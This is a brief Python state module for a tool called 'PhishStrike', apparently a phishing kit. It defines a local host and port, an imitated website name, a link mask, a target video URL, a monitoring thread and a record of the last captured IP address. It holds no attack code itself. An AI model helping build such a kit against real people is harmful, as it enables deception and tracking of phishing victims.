"""Shared runtime state for an active PhishStrike session."""

import os
import threading

# Project root (parent of this package)
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

HOST = "127.0.0.1"
PORT = "8080"

website = "Unknown"
mask = ""
target_video_url = ""

monitoring_thread = None
stop_monitoring = threading.Event()
last_captured_ip = ""
qr_counter = 0
